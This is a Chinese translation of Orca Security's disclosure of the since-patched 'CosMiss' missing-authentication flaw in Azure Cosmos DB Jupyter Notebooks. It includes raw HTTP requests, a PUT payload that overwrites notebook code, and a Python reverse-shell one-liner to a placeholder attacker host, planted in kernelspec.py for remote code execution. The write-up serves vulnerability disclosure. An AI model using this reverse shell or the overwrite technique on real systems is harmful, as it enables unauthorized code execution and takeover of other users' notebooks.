#  CosMiss：Azure Cosmos DB Notebooks远程代码执行漏洞详解   
布加迪  嘶吼专业版   2022-11-08 12:00  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/wpkib3J60o297rwgIksvLibPOwR24tqI8dGRUah80YoBLjTBJgws2n0ibdvfvv3CCm0MIOHTAgKicmOB4UHUJ1hH5g/640?wx_fmt=gif "")  
  
我们最近在Azure Cosmos DB中发现了一个很严重的漏洞，即Cosmos DB Notebooks缺少身份验证检查。我们将该漏洞命名为“CosMiss”。简而言之，如果攻击者知道Notebook的“forwardingId”（即Notebook Workspace的UUID），他们就拥有Notebook的全部权限，包括读写访问权，以及修改运行Notebook的容器的文件系统的能力。只要修改容器文件系统（即用于临时Notebook托管的专用工作区），我们就能够在Notebook容器中实现远程代码执行（RCE）。  
  
发现该漏洞后，Orca Research Pod立即将其报告给微软安全响应中心（MSRC），后者在两天内修复了这个严重问题，这比我们在Azure Synapse中发现的Synapse漏洞的响应速度要快得多。我们验证了修正版，可以确认现在所有的Cosmos DB Notebook用户在访问Notebook之前都需要在请求头中有Authorization（授权）令牌。我们要感谢微软的合作和快速行动，以堵住该漏洞。  
# CosMiss漏洞简介  
  
该漏洞存在于Azure Cosmos DB Jupyter Notebooks，这是微软的快速NoSQL数据库，广泛用于微软自己的电子商务平台和零售行业，用于存储目录数据和订单处理管道中的事件来源。  
  
Jupyter Notebooks内置于Azure Cosmos DB中，被开发人员用来执行常见任务，比如数据清理、数据探索、数据转换和机器学习。我们在研究中发现，Cosmos DB Jupyter Notebooks缺少身份验证检查。  
  
这是特别危险的，因为开发人员使用Cosmos DB Notebooks来创建代码，经常含有高度敏感的信息，比如嵌入在代码中的机密信息（secrets）和私钥。  
  
“CosMiss”漏洞允许未经身份验证的用户获得对Azure Cosmos DB Notebooks的读写访问权、注入代码并覆盖代码，从而实施远程代码执行（RCE）。  
  
然而，攻击者只有在知道Notebook Workspace的UUID（又叫forwardingId）的情况下才能够利用该漏洞。据我们所知，获得forwardingId的唯一方法是，以经过验证的用户的身份打开Notebook。但是forwardingId并未被记录为是机密信息，所以我们没有任何理由相信用户会把它当成机密信息。  
  
2022年10月3日，Orca Security向微软报告了该漏洞，微软在两天内修复了该漏洞，现在要求每个Notebook会话的请求头中有授权令牌。  
# Cosmos DB Notebooks简介  
  
CosMiss漏洞存在于Cosmos DB Jupyter Notebooks中。Azure Cosmos DB是一个快速NoSQL数据库。Azure Cosmos DB包含Jupyter Notebooks，这是一种开源交互开发环境（IDE），以便开发人员创建、执行和共享含有实时代码、方程、可视化和叙事文本的文档。由于开发人员使用Cosmos DB Notebooks来创建代码，因此可能含有高度敏感的信息，比如嵌入在代码中的机密信息和私钥。  
# 利用CosMiss的概念证明  
  
为了演示该漏洞，我们使用Azure Table API和Serverless Capacity模式创建了Cosmos DB。该漏洞还在Core SQL api（推荐）和吞吐量配置的部署环境上进行了验证。  
  
Cosmos DB Data Explorer blade中的Notebooks功能让客户可以使用Jupyter功能（在Python、C#或其他运行时环境中）访问和可视化其数据。此外，客户使用该功能检查来自Cosmos DB的数据，并检查可以使用API进行集成的其他数据源。  
  
**1. 不需要授权头**  
  
当用户创建新的Notebook后，phoenixServiceUrl创建下列端点，它将生成以下项目：  
  
POST  
  
/api/controlplane/toolscontainer/cosmosaccounts/subscriptions/[tenant-id]/resourceGroups/Orca-  
  
Research/providers/Microsoft.DocumentDB/databaseAccounts/orca-cosmos-  
  
dev/containerconnections/multicontainer HTTP/2  
  
Host: tools.cosmos.azure.com  
  
Content-Length: 88  
  
Sec-Ch-Ua: "Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"  
  
Authorization: Bearer  
  
eyJ0eXAiOiJKV1QiLdaaaxxWMFRPSSIsImtpZCI6IjJaUXBKM1VwYmpBWVhZR2FYRUpsOGxWMFRPSSJ9.eyJhdWQddaaam5ldC8yMjdkY2ExZC1iMWE1LTQ0MDEtYTVmZi05N2Q5OTMxZWE4YmUvIiwiaWF0IjoxNjY0NzE4NTI3LCJuYmYiOjE2NjQ3MTg1MjcsImV4cCI6MTY2NDcyMzIxOSwiYWNyIjoiMSIsndkbkZ3d1lKQUNNNjJjdmkrbERTVnRpQWIvdEpDOW9HV2VFd2pwWGhsL2x3aStzVzZWWHB5UmV5ZFpwMVgiLCJhdI0N2QtOTc0ZTUzY2JkZjNjIiwiYXBwaWRhY3Icadasdddddab3NtbyIsIm9pZCI6IjNhMzJkNmU1LWEyYzMtNGM5MS1iOTA5LTc0N2YxNjQ2NDg3MSIsInB1aWQiOiIxMDAzMjAwMjM2RUJBODZEIiwicmgiOiIwLkFZSUFIY3A5SXFXeEFVU2xfNWZaa3g2b3ZrWklmM2tBdXRkUHVrUGF3ZmoyTUJPQ0FHay4iLCJzY3AiOiJ1c2VyX2ltcGVyc29uYXRpb24iLCJzdWIiOiJZTElsRzB1anZDaktlSWo5OHozRk94R3ZvTjl2Umx3UFRtczlOa1dfQng0IiwidGlkIjoiMjI3ZGNhMWQtYjFhNS00NDAxLWE1ZmYtOTdkOTkzMWVhOGJlIiwidW5pcXVlX25hbWUiOiJjb3Ntb0BvcmNhc2VjdXJpdHlyZXNlYXJjaC5vbm1pY3Jvc29mdC5jb20iLCJ1cG4iOiJjb3Ntb0BvcmNhc2VjdXJpdHlyZXNlYXJjaC5vbm1pY3Jvc29mdC5jb20iLCJ1dGkiOiJuZ3VDVm1qZFhrS3RUSW5BaG9GbEFBIiwidmVyIjoiMS4wIiwieG1zX3RjZHQiOjE2MTg4MTYwODl9.Gyd3LXwzBG1yj-JfO0PCXOyD0exC7U-MCXwJBdsadcadad3xLIRZ7NqBq5BhE0WXLV2cgziYf-CAT9QT6oy1yIn58RaRdMojlVbhCpxlfFTdnsOXiorzNwTHzcwwvWsM4fbl2vV-RKMO  
  
Content-Type: application/json  
  
Sec-Ch-Ua-Mobile: ?0  
  
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36  
  
Sec-Ch-Ua-Platform: "macOS"  
  
Accept: /  
  
Origin: https://cosmos.azure.com  
  
Sec-Fetch-Site: same-site  
  
Sec-Fetch-Mode: cors  
  
Sec-Fetch-Dest: empty  
  
Referer: https://cosmos.azure.com/  
  
Accept-Encoding: gzip, deflate  
  
Accept-Language: en-IL,en;q=0.9,he-IL;q=0.8,he;q=0.7,en-US;q=0.6,pl;q=0.5  
  
{"cosmosEndpoint":"https://orca-cosmos-dev.documents.azure.com:443/","poolId":"default"}  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wpkib3J60o2icoKJDeq8n14giabAPJARGpCNEf3s545tpWJdljF8xE9O4vCyh71bVaBt8icUeSzCff5LAd9MwlC7tQ/640?wx_fmt=png "")  
  
图1  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wpkib3J60o2icoKJDeq8n14giabAPJARGpCtX6uDVuZbJHKfGa3zicg1Awic8oNDIyhlhVrta5DxQyQIoXTBukxHyyA/640?wx_fmt=png "")  
  
图2  
  
响应如下：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wpkib3J60o2icoKJDeq8n14giabAPJARGpC5nzIBic9lbzwgBYcG75ax57mvlInpdeUMbo6QDTdIkdnugMyNZEPnLw/640?wx_fmt=png "")  
  
图3  
  
我们可以看到以下项目被创建：  
  
1. 一个https://seasia.tools.cosmos.azure.com端点。  
  
2. 唯一端口（端口范围是10000-10009，后面有详细介绍）。  
  
3. 充当会话/Notebook ID的唯一值（UUIDv4），又叫forwardingId（上面例子中的ab83e033-1670-4bac-a186-32a1c0dddfbc）。  
  
我们可以看到服务器在后台发送的以下端点：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wpkib3J60o2icoKJDeq8n14giabAPJARGpCCAJ3prpXsklqhiaO9nbiaTmG5y9vuKqTKycgAX4H40mVxvYKWsJocYxw/640?wx_fmt=png "")  
  
图4  
  
我们目前的forwardingId似乎是27f180bc-cf93-4c42-b23e-f27a5085da57。  
  
如果检查我们的Notebook服务器（即https://seasia.tools.cosmos.azure.com:10007/）发送的各种请求，似乎所有发送到服务器的请求都含有授权头，如下面截图所示：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wpkib3J60o2icoKJDeq8n14giabAPJARGpCYJQnO0KEdWxalmI1TFAeFFvCicsbCGtTScHqriaR8BzHpyennzAmZ21w/640?wx_fmt=png "")  
  
图5  
  
当我们试图删除授权头并发送相同的请求时，我们看到无需授权头即可列出同一台服务器的不同Notebook。  
  
https://seasia.tools.cosmos.azure.com:10007/api/containergateway/27f180bc-cf93-4c42-b23e-f27a5085da57/api/contents/notebooks  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wpkib3J60o2icoKJDeq8n14giabAPJARGpCVYecpGZFIlbxYCJsF7w26b3VIQmNAlRhfxbiajQPQ94fd9Bicq2ibviaQQ/640?wx_fmt=png "")  
  
图6  
  
由于Cosmos DB Table和Python Query基于Jupyter（+Tornado服务器），我们可以查看作为平台一部分的各种端点：  
  
< https://github.com/jupyter-  
  
server/kernel_gateway/blob/master/kernel_gateway/jupyter_websocket/swagger.json >]  
  
 (< https://github.com/jupyter-  
  
server/kernel_gateway/blob/master/kernel_gateway/jupyter_websocket/swagger.json >) # 36  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wpkib3J60o2icoKJDeq8n14giabAPJARGpC6lzfAlO85MRNdOiaXgIWgKx65OOFDkrgwtXtrgzESRyDTAwgUdY2edg/640?wx_fmt=png "")  
  
图7  
  
在检查各种Security Definitions（安全定义）时，我们可以假设默认情况下当前Security Configurations（安全配置）并没有正确设置，因为需要授权方法用授权头或查询字符串来设置。  
  
考虑到这一点，我们现在可以尝试滥用这种错误配置来操纵各种Notebook和模板。  
  
**2. 覆盖、删除和注入代码**  
  
现在不妨尝试覆盖当前的Notebook数据。首先，我们在Notebook中编写一些示例代码。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wpkib3J60o2icoKJDeq8n14giabAPJARGpCc9TicAqVHIADAicXBb6gQefra10uxtIyKhKKdmpZWMvrTzbxjnDdUvXw/640?wx_fmt=png "")  
  
图8  
  
然后我们保存它：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wpkib3J60o2icoKJDeq8n14giabAPJARGpCxsRDTDNh27xnWiczzYxePNt2R6hd0HFBMVibpcEktvYL4AxAuYIngFog/640?wx_fmt=png "")  
  
图9  
  
我们还可以通过Burp来检查Notebook（Untitled.ipynb）：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wpkib3J60o2icoKJDeq8n14giabAPJARGpCbRAG7oKtBVclpx4FtEqOY3G9j7OzB9kHL83PGgPX8KFXicrvsJrOKBQ/640?wx_fmt=png "")  
  
图10  
  
此外，我们可以从以下端点获取kernel_id：  
  
<https://seasia.tools.cosmos.azure.com:10002/api/containergateway/ab83e033-1670-4bac-a186-  
  
32a1c0dddfbc/api/kernels/>  
  
发送上述请求，我们将获得以下id：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wpkib3J60o2icoKJDeq8n14giabAPJARGpCJiaArUzAg5B3RyMMnsyt2rL524klX28d34SLvMic3Avo6utXZo0zL5BA/640?wx_fmt=png "")  
  
图11  
  
现在不妨使用以下的JSON攻击载荷向Notebook本身发送PUT请求，从而覆盖随机的Notebook：  
  
source parameter ⇒ “print(’Hacked’)”  
  
text parameter ⇒ “print(’Hacked’)”  
# PUT  
  
/api/containergateway/27f180bc-cf93-4c42-b23e-f27a5085da57/api/contents/notebooks/Untitled.ipynb HTTP/2  
  
Host: [seasia.tools.cosmos.azure.com:1000](  
  
Content-Length: 983  
  
Sec-Ch-Ua: "Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"  
  
Content-Type: application/json  
  
Sec-Ch-Ua-Mobile: ?0  
  
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36  
  
Sec-Ch-Ua-Platform: "macOS"  
  
Accept: */*  
  
Origin: [  
  
Sec-Fetch-Site: same-site  
  
Sec-Fetch-Mode: cors  
  
Sec-Fetch-Dest: empty  
  
Referer: [  
  
Accept-Encoding: gzip, deflate  
  
Accept-Language: en-IL,en;q=0.9,he-IL;q=0.8,he;q=0.7,en-US;q=0.6,pl;q=0.5  
  
{"kernel":{"id":null,"name":"python3"},"name":"",  
  
"content": {"cells": [{"cell_type": "code", "execution_count": 1, "id": "47bdbef0-ea14-4960-8789-7983e63312dd", "metadata": {"collapsed": true, "execution": {"iopub.execute_input": "2022-10-02T08:06:27.283Z", "iopub.status.busy": "2022-10-02T08:06:27.277Z", "iopub.status.idle": "2022-10-02T08:06:27.299Z", "shell.execute_reply": "2022-10-02T08:06:27.292Z"}, "jupyter": {"outputs_hidden": false, "source_hidden": false}, "nteract": {"transient": {"deleting": false}}, "trusted": true}, "outputs": [{"name": "stdout", "output_type": "stream", "text": "hacked\\n"}], "source": "print('Hacked!')"}], "metadata": {"language_info": {"file_extension": "ipynb", "mimetype": "application/json", "name": "python", "version": "3.7"}, "nteract": {"version": "dataExplorer 1.0"}}, "nbformat": 4, "nbformat_minor": 5}, "format": "json", "mimetype": null, "size": 993, "writable": true, "path":"notebooks/Untitled.ipynb","type":"notebook"}  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wpkib3J60o2icoKJDeq8n14giabAPJARGpCSRe7FgDDj2UFicicoicobGsvs0jthkialG4b6zH1UaQYoibcGViadguz1mDw/640?wx_fmt=png "")  
  
图12  
  
然后，我们通过退出Notebook本身（点击X符号）来检查更新后的Notebook，然后通过点击Tables API标题右侧的Refresh（刷新）按钮来刷新表/Notebook：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wpkib3J60o2icoKJDeq8n14giabAPJARGpCnIBg2bQ16P7RR6751JNr6gHDsh2IyQEYdgHLibDmKmvuZXkiaTN9hZkQ/640?wx_fmt=png "")  
  
图13  
  
我们可以看到，通过将精心设计的攻击载荷直接发送到服务器，Notebook中的代码被覆盖了。我们还设法检索任何Notebook，删除并向其中注入代码，不管我们是连接到Azure，还是只是一个身份未经认证的用户。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wpkib3J60o2icoKJDeq8n14giabAPJARGpCeb6q004LC5Mypvy3dWia2KgKqh6NkUicUVreksZZIjly8hWZTytxicoqA/640?wx_fmt=png "")  
  
图14  
  
在下面的视频中，我们演示上述概念证明。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wpkib3J60o2icoKJDeq8n14giabAPJARGpCARiaiaheZeoP0eDImXicvAia18UzMgMicicXP0bCf2ibxXwWn8cXIibWFU4Eew/640?wx_fmt=png "")  
  
图15  
  
**3. 远程代码执行（RCE）**  
  
当通过Azure UI加载Cosmos Data Explorer时，Explorer仪表板由以下文件构建：  
  
/home/cosmosuser/.local/lib/python3.6/site-packages / jupyter_client / kernelspec.py  
  
现在，由于我们成功地覆盖了/home/cosmosuser目录中的任何文件，我们可以操纵该文件，并向其添加以下行：  
  
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\"ATTACKER_ID\\",ATTACKER_PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\\"/bin/bash\\")  
  
这样一来，当Data Explorer加载时，整个python代码的这部分也将被执行，并最终将通过客户机为任何远程攻击者提供反向shell。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wpkib3J60o2icoKJDeq8n14giabAPJARGpCJCncb0P2D7NBAsSZdOtB5G5NDeW7ciaNGAH4hOOfkuNssLZKlvXkuHQ/640?wx_fmt=png "")  
  
图16  
  
通过发送含有文件原始内容+ RCE行的PUT请求来修改文件：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wpkib3J60o2icoKJDeq8n14giabAPJARGpCHMiat0ZQBIjXBaeibQQPw1BHeaiafrZqrnzysfz73GaH0iamiapEIG9aIWg/640?wx_fmt=png "")  
  
图17  
  
刷新Data Explorer页面后，我们应该得到一个反向shell。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wpkib3J60o2icoKJDeq8n14giabAPJARGpCNQfcXsJ5LP30fhzPrHJic9QZTichwmxOuZrxX0lxY1HC81XuUOKOO2WA/640?wx_fmt=png "")  
  
图18  
  
以下视频演示了这个RCE：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wpkib3J60o2icoKJDeq8n14giabAPJARGpCKWsZe7PRfyHfVs6UGWJbKo49IACHHYSX2tMyNLJHMn6rpq8Vs98eyg/640?wx_fmt=png "")  
  
图19  
  
参考及来源：https://orca.security/resources/blog/cosmiss-vulnerability-azure-cosmos-db/  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wpkib3J60o2icoKJDeq8n14giabAPJARGpCZ7SBNXotRYKNicFibdbRw1vxWa68YnG9arN0LPVvaUw8zicmZDx9QbP2Q/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wpkib3J60o2icoKJDeq8n14giabAPJARGpCdq3JGibhAOF1hY3VcGcQ7LW4iauIMicbF2mlLdAZ8SfHt7FxicXBKQ2Ihw/640?wx_fmt=png "")  
  
  
